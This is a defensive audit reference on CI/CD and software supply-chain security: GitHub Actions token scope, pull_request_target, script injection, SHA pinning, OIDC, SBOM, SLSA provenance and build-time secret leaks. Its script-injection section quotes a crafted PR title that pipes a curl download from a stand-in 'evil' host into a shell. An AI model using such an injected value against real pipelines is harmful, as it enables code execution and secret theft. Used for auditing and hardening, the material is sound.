# Software Supply Chain & CI/CD Security - GitHub Actions, SBOM, SLSA, Provenance

Companion to `backend-audit`. A backend with clean app code can still be fully owned via the CI/CD pipeline, dependency *execution*, or the release path. This pack adds the pipeline/build/release attack surface that SKILL.md §6 (cargo audit/deny/tree, typosquats) does not cover. Activate when `.github/workflows/`, other CI config, or release/publish scripts exist. (Crate-advisory + `cargo-vet`/`cargo-geiger`/fuzzing depth lives in `references/rust-unsafe-fuzzing-tooling.md`.)

## A. CI/CD config inventory (do this first)

Enumerate everything that runs automatically and classify each by trust + secret access:
- `.github/workflows/*.{yml,yaml}`, composite/reusable actions, `action.yml`; GitLab `.gitlab-ci.yml`; CircleCI `.circleci/config.yml`; `Jenkinsfile`; `release.toml`/`cargo-release`, `cargo dist`, `Makefile`/`justfile`/`xtask` release targets; `Dockerfile`/`docker-compose` build steps; `renovate.json`/`.github/dependabot.yml`.
- For EACH job answer: (1) what TRIGGER fires it (`on:`)? (2) does it run UNTRUSTED code (a fork PR's source/deps/build scripts)? (3) what SECRETS / token scope does it have? The dangerous quadrant is **untrusted code x secret access** - map it explicitly. This is OWASP CICD-SEC-4 (Poisoned Pipeline Execution).
- Also flag system-config weaknesses (CICD-SEC-7 Insecure System Configuration): repo settings allowing Actions to be modified without review, fork PRs auto-running workflows without approval (`Require approval for all outside collaborators` off), branch protection not enforcing required status checks / signed commits on the deploy branch.
- Note self-hosted runners: non-ephemeral self-hosted runners on public repos are RCE-for-anyone and persist state between jobs - CRITICAL. Prefer ephemeral/GitHub-hosted, or `runs-on` gated to private repos only.
- Platform-specific equivalents to check by the same trustxsecrets lens: GitLab - protected branches/tags gate protected CI/CD variables; an MR pipeline from a fork or an unprotected branch must not see protected secrets, and `rules:`/`only:` must not expose deploy jobs to forks. CircleCI - "pass secrets to builds from forked pull requests" must be OFF; contexts should be restricted by security group. Jenkins - `Jenkinsfile` from an untrusted PR running on a shared agent is PPE.

## B. GitHub Actions hardening

**Token scope - default-deny.** Repos created before Feb 2023 default the `GITHUB_TOKEN` to read/write; newer repos default to read-only. Don't rely on the repo default either way - set it explicitly in the workflow.
- Require a minimal top-level `permissions:` block, e.g. `permissions: { contents: read }`, then widen per-job only where needed (`id-token: write` for OIDC, `packages: write` to push, `contents: write` only on the release job). Missing top-level `permissions:` = relying on the implicit/repo-level default = flag. (CICD-SEC-5 Insufficient PBAC.)

**`pull_request_target` - the headline footgun (CRITICAL when mishandled).**
- It runs in the BASE-repo context **with repo secrets and a read/write `GITHUB_TOKEN`**, but is triggered by fork PRs. If such a workflow does `actions/checkout` of the PR HEAD (`ref: ${{ github.event.pull_request.head.sha }}` / `head.ref`) and then BUILDS/TESTS/runs it (`cargo build`/`test`/`run`, `build.rs`, npm install, any script in the PR), an attacker's PR code executes with your secrets = secret exfiltration + repo write = supply-chain RCE.
- Same trap with `workflow_run` chained off a `pull_request` artifact, and with `issue_comment`/`pull_request_review` on forks.
- Acceptable only when it does NOT check out/execute untrusted code (e.g. just labels/comments), or is gated behind an environment with required reviewers, or uses the trusted base-ref code only. Flag any `pull_request_target` + checkout-of-head + build.

**Script injection via untrusted expressions (CWE-94 Code Injection).**
- Interpolating attacker-controlled `github.event.*` fields directly into a `run:` shell - `${{ github.event.pull_request.title }}`, `.body`, `.head.ref` (branch name), `.head.label`, issue/comment bodies, commit messages/author - lets a crafted title like `"; curl evil|sh #` inject shell. The value is substituted into the script BEFORE the shell parses it; quoting in the YAML does not save you.
- Correct pattern: pass untrusted data through an `env:` var (`env: { TITLE: ${{ github.event.pull_request.title }} }`) and reference `"$TITLE"` (quoted) in `run:`; or use `actions/github-script` with `context.payload...` as data, never string-built code. Same rule for `gh` CLI args and for inputs flowing into expressions.

**Pin third-party actions to a full commit SHA, not a tag.**
- `uses: some/action@v4` / `@main` is a mutable ref - the owner (or an account takeover) can repoint it and run in your pipeline (the March 2025 `tj-actions/changed-files` tag-repoint incident, CVE-2025-30066, which exfiltrated CI secrets to workflow logs across 20k+ repos). Require full 40-char SHA pins (`uses: some/action@<sha>  # v4.1.2`), ideally with Dependabot keeping the comment current. First-party `actions/*` by SHA too for high-trust jobs. (CICD-SEC-3 Dependency Chain Abuse / CWE-1357.)

**Cross-workflow / artifact trust.** A `workflow_run` consumer must not blindly trust artifacts/job-outputs produced by a fork-triggered `pull_request` run; treat downloaded artifacts and `needs.<job>.outputs` from untrusted runs as attacker-controlled data, not as code or trusted paths. Re-validate before use.

**Other red flags:** secrets ever exposed to fork-triggered jobs; `secrets: inherit` on reusable workflows called from untrusted contexts; long-lived PATs in `secrets` where a fine-grained token or OIDC would do; deploy jobs without a GitHub **Environment** + **required reviewers**/branch protection (a single push -> prod = CICD-SEC-1 Insufficient Flow Control); caches keyed on untrusted input poisoning later runs (see §H); `actions/checkout` left with `persist-credentials: true` (default) in a job that then runs untrusted code, leaking the token via `.git/config`.

## C. OIDC to cloud (kill long-lived static creds)

- Prefer short-lived, OIDC-federated cloud credentials over static `AWS_SECRET_ACCESS_KEY`/`GCP_SA_KEY`/`AZURE_*` stored in repo secrets. Requires job `permissions: id-token: write`.
- The cloud trust policy MUST constrain the OIDC subject (`sub`) by repo AND ref/environment - e.g. `repo:org/name:ref:refs/heads/main` or `repo:org/name:environment:production`. A trust policy that matches `repo:org/*` or any branch (`:ref:refs/heads/*`, or only `:pull_request`) lets any branch/fork PR assume prod creds - HIGH. Verify `aud` is set to the cloud provider, not the default. (CICD-SEC-2 Inadequate Identity and Access Management.)

## D. SBOM (generate, ship, and keep scanning)

- Produce a machine-readable SBOM for every release artifact: **CycloneDX** via `cargo cyclonedx` (`-f json`), or **SPDX**; embed a dependency manifest in the binary with `cargo auditable build` (then `cargo audit bin <binary>` scans the shipped binary, catching drift between `Cargo.lock` and what actually shipped).
- Red flags: no SBOM at all; SBOM generated once and never re-scanned (new CVEs land against frozen deps daily - wire continuous scanning of the stored SBOM, e.g. `grype`/`osv-scanner` against the CycloneDX/SPDX file); SBOM not attached to the release/registry alongside the artifact. Maps to NIST SSDF PS.3.2 (collect/share provenance data per release, e.g. in an SBOM) and CICD-SEC-3.

## E. SLSA & build provenance

- Target a stated **SLSA** build level. L1 = provenance exists; L2 = signed provenance from a hosted build service; L3 = hardened, non-falsifiable provenance (isolated, ephemeral builder). Most GitHub-hosted release pipelines can reach Build L3 with the official tooling.
- Generate **build provenance attestations**: GitHub `actions/attest-build-provenance` (artifact attestations, backed by Sigstore) or `slsa-framework/slsa-github-generator`. Provenance must record the source commit, the builder identity, and the build parameters, and be verifiable (`gh attestation verify <artifact> --repo org/name`, or `slsa-verifier` for the generator's output).
- For multi-step pipelines, use **in-toto** layouts/attestations to bind each step (build -> test -> package -> publish) to an authorized functionary, so no single step can be skipped or forged. Red flag: a release with no provenance - artifact is untraceable to a commit + builder.

## F. Artifact / image integrity (CICD-SEC-9)

- Sign release artifacts and container images with **Sigstore cosign** (keyless/OIDC signing preferred over a long-lived key); for containers also attach the SBOM and provenance as referrers (`cosign attest`).
- Verify on consume: deploy/admission must `cosign verify` (or `gh attestation verify`) against the expected identity/issuer before running an image - signing without enforced verification is theatre.
- Every published artifact must be traceable to (commit SHA + builder identity + build params) via its provenance; unsigned/unverifiable images in the deploy path = HIGH (CICD-SEC-9 Improper Artifact Integrity Validation). Cross-ref `references/web-crypto-hardening-rust.md` for signature-verification correctness (constant-time, raw-bytes) - same principles apply to verifying attestations.

## G. Dependency risk in the pipeline (execution-time, beyond cargo audit)

- **Dependency confusion / substitution (CWE-1357 Reliance on Insufficiently Trustworthy Component; CICD-SEC-3):** if an internal/alternate registry is configured, resolution must not silently fall back to crates.io for an internal-named crate. In `.cargo/config.toml` audit `[registries]`, `[source.crates-io] replace-with`, and `[source.<name>]` mirrors - a misconfigured `replace-with` or an attacker publishing your internal crate name to crates.io can substitute a malicious crate. Pin internal deps to the explicit `registry = "..."` and prefer a vendored/mirrored source (`cargo vendor`) for builds.
- **Non-registry deps in `Cargo.toml`:** `git = "..."` (especially `branch =`/no rev), `path = "../.."` escaping the repo, and unpinned `git` deps are mutable code-execution sources - require a pinned `rev =` (commit SHA) for any `git` dependency; flag branch/tag-tracked git deps. `Cargo.lock` MUST be committed for binaries/services.
- **Build scripts and proc-macros execute at build time with full developer/CI privileges** - a transitively pulled `build.rs` or proc-macro runs your CI. New/changed transitive deps that add a `build.rs` deserve scrutiny (this is the `cargo-vet`/`cargo-geiger` review surface - see `references/rust-unsafe-fuzzing-tooling.md`).
- **Dependency-update bots:** do not auto-merge Dependabot/Renovate PRs without review (`automerge: true` on all updates blindly trusts upstream + the bot). A compromised upstream release auto-lands. Require human review on the PR diff/lockfile (CICD-SEC-3).
- **Publish path:** the `CARGO_REGISTRY_TOKEN` / npm / registry token used for `cargo publish` is a high-value credential - scope it to the publish job only, prefer a short-lived/trusted-publishing flow, and never expose it to test/build jobs that run untrusted code. A leaked publish token = upstream-package takeover.

## H. Build-time secret exposure

- **`build.rs` / proc-macros reading CI env or secrets and exfiltrating:** a build script can read `std::env` (CI injects secrets there) and make network calls. Flag any `build.rs`/proc-macro doing I/O, env reads of secret-shaped names, or network access. Restrict which env vars reach the build (don't blanket-export secrets into the build job).
- **Secrets printed to build logs:** `echo $SECRET`, `set -x` with secrets in scope, `cargo`/`docker build --build-arg` secrets, or a panic/error printing a secret - public-repo CI logs are world-readable. Use `::add-mask::`, GitHub Environments, `--secret` BuildKit mounts (not `--build-arg`), and verify nothing dumps env.
- **Secrets baked into caches/artifacts:** secrets written into the Cargo registry/target cache, a layer in the final image (visible via `docker history`/layer extraction), or an uploaded artifact persist beyond the job. Use multi-stage builds with the runtime stage carrying no secrets; never `COPY` a creds file into a published layer. Cache keys must not be controllable by untrusted PRs (cache poisoning feeds a later trusted job). (CICD-SEC-6 Insufficient Credential Hygiene.)
- **Visibility (CICD-SEC-10 Insufficient Logging and Visibility):** pipeline/audit logs for who triggered deploys, what versions shipped, and provenance-verify outcomes should be retained and tamper-evident - absent build/deploy logging means a pipeline compromise is undetectable and un-investigable. Rotate any credential that may have transited a public log; treat exposure as compromise, not theoretical.

## Cross-references

- Parent SKILL.md §6 (Dependency and Supply Chain Risk) for `cargo audit`/`cargo deny check`/`cargo tree`, lockfile review, and typosquat heuristics - this pack assumes those run and goes after the pipeline/build/release layer instead.
- `references/rust-unsafe-fuzzing-tooling.md` - crate-advisory depth, `cargo-vet`, `cargo-geiger`, fuzzing of parsers reachable from untrusted input.
- `references/cloud-container-iac-security.md` - image-scanning, multi-stage Dockerfiles, and admission-side `cosign verify` enforcement in the deploy environment.
- `references/web-crypto-hardening-rust.md` - signature/attestation verification correctness; `references/ai-agent-audit-failure-patterns.md` - AI-authored CI configs that hallucinate actions/flags or leave `automerge` on.

## Sources

- OWASP Top 10 CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- NIST SSDF SP 800-218: https://csrc.nist.gov/pubs/sp/800/218/final
- SLSA: https://slsa.dev/spec/
- in-toto: https://in-toto.io/
- CycloneDX: https://cyclonedx.org/
- SPDX: https://spdx.dev/
